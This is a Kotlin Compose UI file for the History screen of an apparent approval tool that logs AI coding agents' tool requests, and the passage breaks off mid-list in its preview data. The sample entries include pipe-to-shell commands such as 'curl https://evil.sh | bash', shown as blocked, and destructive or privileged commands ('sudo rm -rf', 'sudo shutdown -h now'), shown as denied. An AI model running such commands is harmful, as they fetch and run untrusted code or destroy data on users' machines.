package com.mikepenz.agentbelay.ui.history

import androidx.compose.foundation.ExperimentalFoundationApi
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.horizontalScroll
import androidx.compose.foundation.hoverable
import androidx.compose.foundation.interaction.MutableInteractionSource
import androidx.compose.foundation.interaction.collectIsHoveredAsState
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Box
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Row
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxHeight
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.fillMaxWidth
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.foundation.layout.size
import androidx.compose.foundation.layout.width
import androidx.compose.foundation.layout.widthIn
import androidx.compose.foundation.layout.BoxWithConstraints
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.itemsIndexed
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.BasicTextField
import androidx.compose.material3.Icon
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.CompositionLocalProvider
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.remember
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.graphics.SolidColor
import androidx.compose.ui.text.TextStyle
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.text.style.TextOverflow
import androidx.compose.ui.tooling.preview.Preview
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.mikepenz.agentbelay.model.Source
import com.mikepenz.agentbelay.model.ToolType
import com.mikepenz.agentbelay.ui.components.BadgeChip
import com.mikepenz.agentbelay.ui.components.DecisionStatus
import com.mikepenz.agentbelay.ui.components.HorizontalHairline
import kotlinx.serialization.json.JsonElement
import com.mikepenz.agentbelay.ui.components.LocalPreviewHoverOverride
import com.mikepenz.agentbelay.ui.components.PillSegmented
import com.mikepenz.agentbelay.ui.components.RedactionPill
import com.mikepenz.agentbelay.ui.components.RiskPill
import com.mikepenz.agentbelay.ui.components.SourceTag
import com.mikepenz.agentbelay.ui.components.StatusPill
import com.mikepenz.agentbelay.ui.components.TagSize
import com.mikepenz.agentbelay.ui.components.sourceAccentColor
import com.mikepenz.agentbelay.ui.components.sourceDisplayName
import com.mikepenz.agentbelay.ui.components.ToolTag
import com.mikepenz.agentbelay.ui.icons.LucideChevronDown
import com.mikepenz.agentbelay.ui.icons.LucideChevronRight
import com.mikepenz.agentbelay.ui.icons.LucideSearch
import com.mikepenz.agentbelay.ui.theme.AgentBelayColors
import com.mikepenz.agentbelay.ui.theme.PreviewScaffold

/** Projection of a history event for the design-first screen. */
data class HistoryEntry(
    val id: String,
    val tool: String,
    val source: Source,
    val summary: String,
    val status: DecisionStatus,
    val risk: Int? = null,
    val via: String? = null,
    val time: String,
    val tag: String? = null,
    val workingDir: String? = null,
    val timeToDecision: String? = null,
    val feedback: String? = null,
    val assessment: String? = null,
    val prompt: String? = null,
    val toolType: ToolType = ToolType.DEFAULT,
    val toolInput: Map<String, JsonElement> = emptyMap(),
    val rawRequestJson: String? = null,
    val rawResponseJson: String? = null,
    /** Raw validation LLM output (Ollama JSON / Claude CLI stdout / Copilot stdout). */
    val rawValidationResponseJson: String? = null,
    /**
     * Number of redaction spans replaced by the post-tool-use engine for
     * this entry, or 0 when nothing was redacted. Drives the [RedactionPill]
     * shown alongside the [RiskPill] in both row variants.
     */
    val redactionCount: Int = 0,
)

/**
 * Sort order for the History toolbar. Mirrors the Insights tab so users
 * carry one mental model between screens.
 */
enum class HistorySort(val label: String) {
    Recent("Recent"),
    Tool("Tool"),
    Source("Source"),
}

/** Multi-select harness filter check. `null` = no filter. */
internal fun HistoryEntry.matchesHarnessFilter(filter: Set<Source>?): Boolean =
    filter == null || filter.isEmpty() || source in filter

internal fun HistoryEntry.matchesQuery(query: String): Boolean {
    if (query.isBlank()) return true
    val q = query.lowercase()
    return tool.lowercase().contains(q) ||
        summary.lowercase().contains(q) ||
        sourceDisplayName(source).lowercase().contains(q)
}

/**
 * Ready-to-render state for the History screen. All filtering, counting and
 * projection from persisted `ApprovalResult` to `HistoryEntry` happens in
 * [HistoryViewModel] — the screen just renders [entries] as-is. This keeps
 * per-keystroke work off the composition thread and makes the screen's
 * recomposition cost independent of total history size.
 */
data class HistoryUiState(
    val entries: List<HistoryEntry>,
    val total: Int,
    val counts: HistoryCounts,
    val scope: HistoryScope,
    val query: String,
    val sort: HistorySort = HistorySort.Recent,
    /**
     * Multi-select harness filter. `null` = no filter (show every harness
     * present in [entries]).
     */
    val harnessFilter: Set<Source>? = null,
    /**
     * Harnesses actually present in the unfiltered history projection.
     * Drives the dropdown's option list.
     */
    val availableHarnesses: List<Source> = emptyList(),
) {
    companion object {
        val Empty = HistoryUiState(
            entries = emptyList(),
            total = 0,
            counts = HistoryCounts(0, 0, 0),
            scope = HistoryScope.All,
            query = "",
        )
    }
}

/**
 * Primary entry point — driven by [HistoryViewModel]. All filter state lives
 * in the VM so the composable itself never re-derives the list.
 */
@Composable
fun HistoryScreen(
    ui: HistoryUiState,
    onScopeChange: (HistoryScope) -> Unit,
    onQueryChange: (String) -> Unit,
    onSortChange: (HistorySort) -> Unit = {},
    onHarnessFilterChange: (Set<Source>?) -> Unit = {},
    modifier: Modifier = Modifier,
    initialExpandedId: String? = ui.entries.firstOrNull()?.id,
    onReplay: ((id: String) -> Unit)? = null,
) {
    var expandedId by remember { mutableStateOf(initialExpandedId) }

    // Min content width: header and table scroll together as one unit.
    val hScroll = rememberScrollState()

    BoxWithConstraints(modifier = modifier.fillMaxSize().background(AgentBelayColors.background)) {
        // Compact layout drops the horizontal scroll table in favour of a
        // two-line row that fits any width without truncating the key info.
        // Threshold matches the wide-mode content min (868.dp) minus slack so
        // we switch before columns start visually crunching.
        val compact = maxWidth < 720.dp

        if (compact) {
            Column(modifier = Modifier.fillMaxSize()) {
                HistoryHeader(
                    total = ui.total,
                    showing = ui.entries.size,
                    scope = ui.scope,
                    counts = ui.counts,
                    onScopeChange = onScopeChange,
                    sort = ui.sort,
                    onSortChange = onSortChange,
                    harnessFilter = ui.harnessFilter,
                    availableHarnesses = ui.availableHarnesses,
                    onHarnessFilterChange = onHarnessFilterChange,
                    query = ui.query,
                    onQueryChange = onQueryChange,
                    compact = true,
                )

                if (ui.entries.isEmpty()) {
                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        Text(
                            text = "No matching events.",
                            color = AgentBelayColors.inkMuted,
                            fontSize = 13.sp,
                        )
                    }
                } else {
                    LazyColumn(modifier = Modifier.fillMaxWidth().weight(1f)) {
                        itemsIndexed(
                            items = ui.entries,
                            key = { _, entry -> entry.id },
                        ) { idx, entry ->
                            HistoryRowCompact(
                                entry = entry,
                                expanded = expandedId == entry.id,
                                onToggle = {
                                    expandedId = if (expandedId == entry.id) null else entry.id
                                },
                                isLast = idx == ui.entries.lastIndex,
                                onReplay = onReplay,
                            )
                        }
                    }
                }
            }
            return@BoxWithConstraints
        }

        val contentWidth = maxOf(maxWidth, 868.dp)
        Box(modifier = Modifier.fillMaxSize().horizontalScroll(hScroll)) {
            Column(modifier = Modifier.fillMaxHeight().width(contentWidth)) {
                HistoryHeader(
                    total = ui.total,
                    showing = ui.entries.size,
                    scope = ui.scope,
                    counts = ui.counts,
                    onScopeChange = onScopeChange,
                    sort = ui.sort,
                    onSortChange = onSortChange,
                    harnessFilter = ui.harnessFilter,
                    availableHarnesses = ui.availableHarnesses,
                    onHarnessFilterChange = onHarnessFilterChange,
                    query = ui.query,
                    onQueryChange = onQueryChange,
                )

                if (ui.entries.isEmpty()) {
                    Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                        Text(
                            text = "No matching events.",
                            color = AgentBelayColors.inkMuted,
                            fontSize = 13.sp,
                        )
                    }
                } else {
                    // Column headers are rendered outside the LazyColumn so they
                    // stay pinned at the top — same effect as the JSX
                    // `position: sticky, top: 0`.
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(AgentBelayColors.chrome)
                            .padding(horizontal = 28.dp, vertical = 8.dp),
                        horizontalArrangement = Arrangement.spacedBy(14.dp),
                        verticalAlignment = Alignment.CenterVertically,
                    ) {
                        Spacer(Modifier.width(22.dp))
                        ColHeader("Tool", Modifier.width(120.dp))
                        ColHeader("Source", Modifier.width(110.dp))
                        ColHeader("Target", Modifier.weight(1f))
                        ColHeader("Outcome", Modifier.width(200.dp))
                        ColHeader("When", Modifier.width(80.dp), alignEnd = true)
                    }
                    HorizontalHairline()
                    LazyColumn(
                        modifier = Modifier
                            .fillMaxWidth()
                            .weight(1f),
                    ) {
                        itemsIndexed(
                            items = ui.entries,
                            key = { _, entry -> entry.id },
                        ) { idx, entry ->
                            HistoryRow(
                                entry = entry,
                                expanded = expandedId == entry.id,
                                onToggle = {
                                    expandedId = if (expandedId == entry.id) null else entry.id
                                },
                                isLast = idx == ui.entries.lastIndex,
                                onReplay = onReplay,
                            )
                        }
                    }
                }
            }
        }
    }
}

/**
 * Preview/test-friendly overload: constructs a self-contained [HistoryUiState]
 * from a static [items] list and hosts filter state locally. Production code
 * should use the VM-driven overload above.
 */
@Composable
fun HistoryScreen(
    items: List<HistoryEntry>,
    modifier: Modifier = Modifier,
    initialScope: HistoryScope = HistoryScope.All,
    initialQuery: String = "",
    initialSort: HistorySort = HistorySort.Recent,
    initialHarnessFilter: Set<Source>? = null,
    initialExpandedId: String? = items.firstOrNull()?.id,
    onReplay: ((id: String) -> Unit)? = null,
) {
    var scope by remember { mutableStateOf(initialScope) }
    var query by remember { mutableStateOf(initialQuery) }
    var sort by remember { mutableStateOf(initialSort) }
    var harnessFilter by remember { mutableStateOf(initialHarnessFilter) }

    val counts = remember(items) {
        HistoryCounts(
            all = items.size,
            approvals = items.count { it.status in approvalStatuses },
            protections = items.count { it.status in protectionStatuses },
        )
    }
    val filtered = remember(items, scope, query, sort, harnessFilter) {
        val matched = items.filter { entry ->
            val scopeMatch = when (scope) {
                HistoryScope.All -> true
                HistoryScope.Approvals -> entry.status in approvalStatuses
                HistoryScope.Protections -> entry.status in protectionStatuses
            }
            scopeMatch &&
                entry.matchesHarnessFilter(harnessFilter) &&
                entry.matchesQuery(query)
        }
        when (sort) {
            HistorySort.Recent -> matched
            HistorySort.Tool -> matched.sortedBy { it.tool.lowercase() }
            HistorySort.Source -> matched.sortedBy { it.source.ordinal }
        }
    }
    val ui = HistoryUiState(
        entries = filtered,
        total = items.size,
        counts = counts,
        scope = scope,
        query = query,
        sort = sort,
        harnessFilter = harnessFilter,
        availableHarnesses = items.map { it.source }.distinct().sortedBy { it.ordinal },
    )
    HistoryScreen(
        ui = ui,
        onScopeChange = { scope = it },
        onQueryChange = { query = it },
        onSortChange = { sort = it },
        onHarnessFilterChange = { harnessFilter = it?.takeIf { f -> f.isNotEmpty() } },
        modifier = modifier,
        initialExpandedId = initialExpandedId,
        onReplay = onReplay,
    )
}


enum class HistoryScope { All, Approvals, Protections }

internal val approvalStatuses = setOf(
    DecisionStatus.APPROVED,
    DecisionStatus.AUTO_APPROVED,
    DecisionStatus.DENIED,
    DecisionStatus.AUTO_DENIED,
    DecisionStatus.RESOLVED_EXT,
    DecisionStatus.TIMEOUT,
)

internal val protectionStatuses = setOf(
    DecisionStatus.PROTECTION_BLOCKED,
    DecisionStatus.PROTECTION_LOGGED,
)

data class HistoryCounts(val all: Int, val approvals: Int, val protections: Int)

@Composable
private fun HistoryHeader(
    total: Int,
    showing: Int,
    scope: HistoryScope,
    counts: HistoryCounts,
    onScopeChange: (HistoryScope) -> Unit,
    sort: HistorySort,
    onSortChange: (HistorySort) -> Unit,
    harnessFilter: Set<Source>?,
    availableHarnesses: List<Source>,
    onHarnessFilterChange: (Set<Source>?) -> Unit,
    query: String,
    onQueryChange: (String) -> Unit,
    compact: Boolean = false,
) {
    val hPad = if (compact) 16.dp else 28.dp
    Column(modifier = Modifier.fillMaxWidth().padding(start = hPad, end = hPad, top = 18.dp)) {
        // Title row — title+subtitle on the left, search on the right.
        // FlowRow wraps the search below the title at narrow widths.
        androidx.compose.foundation.layout.FlowRow(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalArrangement = Arrangement.spacedBy(12.dp),
        ) {
            Column {
                Text(
                    text = "History",
                    color = AgentBelayColors.inkPrimary,
                    fontSize = 20.sp,
                    fontWeight = FontWeight.SemiBold,
                    letterSpacing = (-0.4).sp,
                )
                Spacer(Modifier.height(4.dp))
                Text(
                    text = "$total decisions recorded · showing $showing",
                    color = AgentBelayColors.inkTertiary,
                    fontSize = 12.5.sp,
                )
            }
            FilterSearchField(
                value = query,
                onChange = onQueryChange,
                modifier = Modifier.widthIn(min = 220.dp).width(260.dp),
            )
        }
        Spacer(Modifier.height(14.dp))
        Segmented(
            items = listOf(
                SegmentItem("all", "All", counts.all) to HistoryScope.All,
                SegmentItem("approvals", "Approvals", counts.approvals) to HistoryScope.Approvals,
                SegmentItem("protections", "Protections", counts.protections) to HistoryScope.Protections,
            ),
            selected = scope,
            onSelect = onScopeChange,
        )
        HorizontalHairline()
        // Sort + harness filter row — same layout used in the Insights tab
        // via [SortAndFilterRow], so the two screens share styling.
        Spacer(Modifier.height(12.dp))
        com.mikepenz.agentbelay.ui.components.SortAndFilterRow(
            sortOptions = HistorySort.entries.map { it to it.label },
            sortSelected = sort,
            onSortChange = onSortChange,
            harnessOptions = availableHarnesses.map { it to sourceDisplayName(it) },
            harnessSelected = harnessFilter,
            onHarnessChange = onHarnessFilterChange,
            harnessLeadingDot = ::sourceAccentColor,
        )
        // Breathing room between the filter row and the table headers below.
        Spacer(Modifier.height(14.dp))
    }
}

@Composable
private fun FilterSearchField(
    value: String,
    onChange: (String) -> Unit,
    modifier: Modifier = Modifier,
) {
    // Mirrors JSX TextInput with search icon + placeholder.
    // Keep static visuals simple: no focus ring animation (BasicTextField is live-editable).
    Row(
        modifier = modifier
            .height(34.dp)
            .clip(RoundedCornerShape(7.dp))
            .background(AgentBelayColors.surface)
            .border(1.dp, AgentBelayColors.line1, RoundedCornerShape(7.dp))
            .padding(horizontal = 12.dp),
        verticalAlignment = Alignment.CenterVertically,
        horizontalArrangement = Arrangement.spacedBy(8.dp),
    ) {
        Icon(
            imageVector = LucideSearch,
            contentDescription = null,
            tint = AgentBelayColors.inkMuted,
            modifier = Modifier.size(13.dp),
        )
        Box(modifier = Modifier.weight(1f), contentAlignment = Alignment.CenterStart) {
            if (value.isEmpty()) {
                Text(
                    text = "Filter by tool, path, session…",
                    color = AgentBelayColors.inkMuted,
                    fontSize = 13.sp,
                    letterSpacing = (-0.05).sp,
                    maxLines = 1,
                    softWrap = false,
                    overflow = TextOverflow.Ellipsis,
                )
            }
            BasicTextField(
                value = value,
                onValueChange = onChange,
                singleLine = true,
                textStyle = TextStyle(
                    color = AgentBelayColors.inkPrimary,
                    fontSize = 13.sp,
                    letterSpacing = (-0.05).sp,
                ),
                cursorBrush = SolidColor(AgentBelayColors.inkPrimary),
                modifier = Modifier.fillMaxWidth(),
            )
        }
    }
}


private data class SegmentItem(val key: String, val label: String, val count: Int)

@Composable
private fun <T> Segmented(
    items: List<Pair<SegmentItem, T>>,
    selected: T,
    onSelect: (T) -> Unit,
) {
    // Underline-tab variant (matches UI.jsx Segmented default variant="tab").
    // Tabs sit on a horizontal baseline divider that spans the row width;
    // the active tab's 1.5dp underline overlays the divider.
    Column(modifier = Modifier.fillMaxWidth()) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(2.dp),
            verticalAlignment = Alignment.Bottom,
        ) {
            items.forEach { (item, key) ->
                val active = selected == key
                SegmentTab(item = item, active = active, onClick = { onSelect(key) })
            }
        }
    }
}

@Composable
private fun SegmentTab(item: SegmentItem, active: Boolean, onClick: () -> Unit) {
    val interactionSource = remember { MutableInteractionSource() }
    val liveHover by interactionSource.collectIsHoveredAsState()
    val isHovered = LocalPreviewHoverOverride.current ?: liveHover

    val fg = when {
        active -> AgentBelayColors.inkPrimary
        isHovered -> AgentBelayColors.inkSecondary
        else -> AgentBelayColors.inkTertiary
    }

    Box(
        modifier = Modifier
            .hoverable(interactionSource)
            .clickable(interactionSource = interactionSource, indication = null) { onClick() },
    ) {
        Row(
            modifier = Modifier.padding(start = 12.dp, end = 12.dp, top = 8.dp, bottom = 10.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            Text(
                text = item.label,
                color = fg,
                fontSize = 12.5.sp,
                fontWeight = FontWeight.Medium,
                letterSpacing = (-0.05).sp,
            )
            BadgeChip(
                text = item.count.toString(),
                background = if (active) AgentBelayColors.surface3 else AgentBelayColors.surface,
                textColor = if (active) AgentBelayColors.inkSecondary else AgentBelayColors.inkMuted,
                mono = true,
            )
        }
        if (active) {
            // matchParentSize() matches the Row's size WITHOUT participating
            // in the parent Box's width measurement — keeping the tab its
            // natural width so siblings aren't pushed off-screen.
            Box(
                modifier = Modifier
                    .matchParentSize(),
            ) {
                Box(
                    modifier = Modifier
                        .align(Alignment.BottomStart)
                        .fillMaxWidth()
                        .height(1.5.dp)
                        .background(AgentBelayColors.inkPrimary),
                )
            }
        }
    }
}

@Composable
private fun ColHeader(text: String, modifier: Modifier = Modifier, alignEnd: Boolean = false) {
    Text(
        text = text.uppercase(),
        color = AgentBelayColors.inkMuted,
        fontSize = 10.5.sp,
        fontWeight = FontWeight.SemiBold,
        letterSpacing = 0.5.sp,
        modifier = modifier,
        textAlign = if (alignEnd) TextAlign.End else TextAlign.Start,
        maxLines = 1,
        softWrap = false,
        overflow = TextOverflow.Clip,
    )
}

@Composable
private fun HistoryRow(
    entry: HistoryEntry,
    expanded: Boolean,
    onToggle: () -> Unit,
    isLast: Boolean,
    onReplay: ((id: String) -> Unit)? = null,
) {
    val interactionSource = remember { MutableInteractionSource() }
    val liveHover by interactionSource.collectIsHoveredAsState()
    val isHovered = LocalPreviewHoverOverride.current ?: liveHover

    // JSX: hover background applies ONLY to the row (via parentElement.style.background).
    // When expanded, bg stays surface regardless of hover.
    val rowBg = when {
        expanded -> AgentBelayColors.surface
        isHovered -> AgentBelayColors.surface
        else -> Color.Transparent
    }

    Column(
        modifier = Modifier
            .fillMaxWidth()
            .background(rowBg)
            .clickable(interactionSource = interactionSource, indication = null) { onToggle() }
            .hoverable(interactionSource),
    ) {
        Row(
            modifier = Modifier.fillMaxWidth().padding(horizontal = 28.dp, vertical = 12.dp),
            horizontalArrangement = Arrangement.spacedBy(14.dp),
            verticalAlignment = Alignment.CenterVertically,
        ) {
            Box(modifier = Modifier.width(22.dp), contentAlignment = Alignment.CenterStart) {
                Icon(
                    imageVector = if (expanded) LucideChevronDown else LucideChevronRight,
                    contentDescription = if (expanded) "Collapse" else "Expand",
                    tint = AgentBelayColors.inkMuted,
                    modifier = Modifier.size(12.dp),
                )
            }
            Box(modifier = Modifier.width(120.dp)) {
                ToolTag(toolName = entry.tool, size = TagSize.SMALL)
            }
            Box(modifier = Modifier.width(110.dp)) {
                SourceTag(source = entry.source)
            }
            Row(
                modifier = Modifier.weight(1f),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                Text(
                    text = entry.summary,
                    color = AgentBelayColors.inkPrimary,
                    fontSize = 12.5.sp,
                    fontFamily = FontFamily.Monospace,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis,
                    letterSpacing = (-0.1).sp,
                    modifier = Modifier.weight(1f, fill = false),
                )
                if (entry.tag != null) {
                    BadgeChip(
                        text = entry.tag,
                        background = com.mikepenz.agentbelay.ui.theme.WarnYellow.copy(alpha = 0.12f),
                        textColor = com.mikepenz.agentbelay.ui.theme.WarnYellow,
                        mono = true,
                        fontSize = 10.sp,
                        horizontalPadding = 6.dp,
                    )
                }
            }
            Row(
                modifier = Modifier.width(200.dp),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                StatusPill(status = entry.status, size = TagSize.SMALL)
                if (entry.risk != null && entry.via != null) {
                    RiskPill(level = entry.risk, via = entry.via)
                }
                RedactionPill(count = entry.redactionCount)
            }
            Text(
                text = entry.time,
                color = AgentBelayColors.inkTertiary,
                fontSize = 11.5.sp,
                fontFamily = FontFamily.Monospace,
                modifier = Modifier.width(80.dp),
                textAlign = TextAlign.End,
                maxLines = 1,
                softWrap = false,
                overflow = TextOverflow.Clip,
            )
        }
        if (expanded) {
            HistoryExpandedDetails(entry, onReplay = onReplay)
        }
        if (!isLast) {
            HorizontalHairline()
        }
    }
}

/**
 * Slim two-line row used when the screen width can't fit the table layout
 * without truncating. Line 1 carries the primary scan-info (tool, target,
 * time), line 2 carries the metadata tags (source, outcome, risk, protection
 * tag). No horizontal scroll.
 */
@Composable
private fun HistoryRowCompact(
    entry: HistoryEntry,
    expanded: Boolean,
    onToggle: () -> Unit,
    isLast: Boolean,
    onReplay: ((id: String) -> Unit)? = null,
) {
    val interactionSource = remember { MutableInteractionSource() }
    val liveHover by interactionSource.collectIsHoveredAsState()
    val isHovered = LocalPreviewHoverOverride.current ?: liveHover

    val rowBg = when {
        expanded -> AgentBelayColors.surface
        isHovered -> AgentBelayColors.surface
        else -> Color.Transparent
    }

    Column(
        modifier = Modifier
            .fillMaxWidth()
            .background(rowBg)
            .clickable(interactionSource = interactionSource, indication = null) { onToggle() }
            .hoverable(interactionSource),
    ) {
        Column(
            modifier = Modifier.fillMaxWidth().padding(horizontal = 16.dp, vertical = 10.dp),
            verticalArrangement = Arrangement.spacedBy(6.dp),
        ) {
            // Line 1: chevron + tool + summary (weighted) + time.
            Row(
                modifier = Modifier.fillMaxWidth(),
                horizontalArrangement = Arrangement.spacedBy(10.dp),
                verticalAlignment = Alignment.CenterVertically,
            ) {
                Icon(
                    imageVector = if (expanded) LucideChevronDown else LucideChevronRight,
                    contentDescription = if (expanded) "Collapse" else "Expand",
                    tint = AgentBelayColors.inkMuted,
                    modifier = Modifier.size(12.dp),
                )
                ToolTag(toolName = entry.tool, size = TagSize.SMALL)
                Text(
                    text = entry.summary,
                    color = AgentBelayColors.inkPrimary,
                    fontSize = 12.5.sp,
                    fontFamily = FontFamily.Monospace,
                    maxLines = 1,
                    overflow = TextOverflow.Ellipsis,
                    letterSpacing = (-0.1).sp,
                    modifier = Modifier.weight(1f),
                )
                Text(
                    text = entry.time,
                    color = AgentBelayColors.inkTertiary,
                    fontSize = 11.5.sp,
                    fontFamily = FontFamily.Monospace,
                    maxLines = 1,
                    softWrap = false,
                    overflow = TextOverflow.Clip,
                )
            }
            // Line 2: source + status + risk + optional protection tag.
            // FlowRow lets the pills wrap gracefully on very narrow widths.
            androidx.compose.foundation.layout.FlowRow(
                modifier = Modifier.fillMaxWidth().padding(start = 22.dp),
                horizontalArrangement = Arrangement.spacedBy(8.dp),
                verticalArrangement = Arrangement.spacedBy(6.dp),
            ) {
                SourceTag(source = entry.source)
                StatusPill(status = entry.status, size = TagSize.SMALL)
                if (entry.risk != null && entry.via != null) {
                    RiskPill(level = entry.risk, via = entry.via)
                }
                RedactionPill(count = entry.redactionCount)
                if (entry.tag != null) {
                    BadgeChip(
                        text = entry.tag,
                        background = com.mikepenz.agentbelay.ui.theme.WarnYellow.copy(alpha = 0.12f),
                        textColor = com.mikepenz.agentbelay.ui.theme.WarnYellow,
                        mono = true,
                        fontSize = 10.sp,
                        horizontalPadding = 6.dp,
                    )
                }
            }
        }
        if (expanded) {
            HistoryExpandedDetails(entry, onReplay = onReplay, compact = true)
        }
        if (!isLast) {
            HorizontalHairline()
        }
    }
}

private fun sampleHistory() = listOf(
    HistoryEntry(
        id = "1",
        tool = "Bash",
        source = Source.CLAUDE_CODE,
        summary = "pnpm install --frozen-lockfile",
        status = DecisionStatus.APPROVED,
        risk = 2,
        via = "claude",
        time = "2 min ago",
        assessment = "Routine dependency install; no destructive flags.",
        workingDir = "/Users/mike/dev/agent-belay",
        timeToDecision = "3.2s",
        feedback = "—",
        prompt = "Claude Code asked to run pnpm install to sync dependencies.",
    ),
    HistoryEntry(
        id = "2",
        tool = "WebFetch",
        source = Source.CLAUDE_CODE,
        summary = "GET https://api.github.com/repos/mikepenz/agent-belay/commits",
        status = DecisionStatus.AUTO_APPROVED,
        risk = 1,
        via = "claude",
        time = "14 min ago",
    ),
    HistoryEntry(
        id = "3",
        tool = "Bash",
        source = Source.COPILOT,
        summary = "sudo rm -rf /tmp/build-cache",
        status = DecisionStatus.DENIED,
        risk = 4,
        via = "claude",
        time = "22 min ago",
        tag = "sudo",
    ),
    HistoryEntry(
        id = "4",
        tool = "Edit",
        source = Source.CLAUDE_CODE,
        summary = "Write composeApp/src/.../Theme.kt (+18 / −4)",
        status = DecisionStatus.AUTO_APPROVED,
        risk = 1,
        via = "claude",
        time = "38 min ago",
    ),
    HistoryEntry(
        id = "5",
        tool = "Bash",
        source = Source.CLAUDE_CODE,
        summary = "curl -sSL https://get.docker.com | sh",
        status = DecisionStatus.PROTECTION_BLOCKED,
        time = "1h ago",
        tag = "curl|sh",
    ),
    HistoryEntry(
        id = "6",
        tool = "Bash",
        source = Source.COPILOT,
        summary = "./gradlew :composeApp:jvmTest",
        status = DecisionStatus.APPROVED,
        risk = 1,
        via = "claude",
        time = "1h ago",
    ),
)

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryScreen() {
    PreviewScaffold {
        HistoryScreen(items = sampleHistory())
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryEmpty() {
    PreviewScaffold {
        HistoryScreen(items = emptyList())
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryApprovalsTab() {
    PreviewScaffold {
        // Filter state starts at All; simulate Approvals filter by dropping protection entries.
        HistoryScreen(
            items = sampleHistory().filter {
                it.status != DecisionStatus.PROTECTION_BLOCKED &&
                    it.status != DecisionStatus.PROTECTION_LOGGED
            },
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryFilteredByClaude() {
    // Harness multi-select pre-set to Claude — drops Copilot rows.
    PreviewScaffold {
        HistoryScreen(
            items = sampleHistory(),
            initialHarnessFilter = setOf(Source.CLAUDE_CODE),
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryFilteredByCopilot() {
    // Harness multi-select pre-set to Copilot — drops Claude rows.
    PreviewScaffold {
        HistoryScreen(
            items = sampleHistory(),
            initialHarnessFilter = setOf(Source.COPILOT),
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryExpandedNoDetail() {
    // Row 2 ("WebFetch GET ...") has no assessment/detail; expanding it must
    // show the italic "No additional detail captured" fallback.
    PreviewScaffold {
        HistoryScreen(
            items = sampleHistory(),
            initialExpandedId = "2",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryNoExpansion() {
    // All rows collapsed — verify default row chrome (transparent bg, line dividers).
    PreviewScaffold {
        HistoryScreen(
            items = sampleHistory(),
            initialExpandedId = null,
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryWithQuery() {
    // Query-filtered — "pnpm" matches only the first sample entry.
    PreviewScaffold {
        HistoryScreen(
            items = sampleHistory(),
            initialQuery = "pnpm",
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryTabProtections() {
    PreviewScaffold {
        HistoryScreen(
            items = sampleHistory(),
            initialScope = HistoryScope.Protections,
        )
    }
}

@Preview(widthDp = 1088, heightDp = 860)
@Composable
private fun PreviewHistoryStatusVariants() {
    PreviewScaffold {
        HistoryScreen(
            items = listOf(
                HistoryEntry(
                    id = "approved",
                    tool = "Bash",
                    source = Source.CLAUDE_CODE,
                    summary = "npm run build",
                    status = DecisionStatus.APPROVED,
                    risk = 1,
                    via = "claude",
                    time = "just now",
                ),
                HistoryEntry(
                    id = "auto-approved",
                    tool = "Read",
                    source = Source.CLAUDE_CODE,
                    summary = "Read src/lib/utils.ts",
                    status = DecisionStatus.AUTO_APPROVED,
                    risk = 1,
                    via = "claude",
                    time = "3 min ago",
                ),
                HistoryEntry(
                    id = "denied",
                    tool = "Bash",
                    source = Source.COPILOT,
                    summary = "rm -rf node_modules",
                    status = DecisionStatus.DENIED,
                    risk = 4,
                    via = "claude",
                    time = "8 min ago",
                    tag = "rm -rf",
                ),
                HistoryEntry(
                    id = "auto-denied",
                    tool = "Bash",
                    source = Source.CLAUDE_CODE,
                    summary = "sudo shutdown -h now",
                    status = DecisionStatus.AUTO_DENIED,
                    risk = 5,
                    via = "claude",
                    time = "12 min ago",
                    tag = "sudo",
                ),
                HistoryEntry(
                    id = "resolved-ext",
                    tool = "AskUserQuestion",
                    source = Source.CLAUDE_CODE,
                    summary = "Confirm deploy to production?",
                    status = DecisionStatus.RESOLVED_EXT,
                    time = "20 min ago",
                ),
                HistoryEntry(
                    id = "protection-blocked",
                    tool = "Bash",
                    source = Source.COPILOT,
                    summary = "curl https://evil.sh | bash",
                    status = DecisionStatus.PROTECTION_BLOCKED,
                    time = "30 min ago",
                    tag = "curl|sh",
                ),
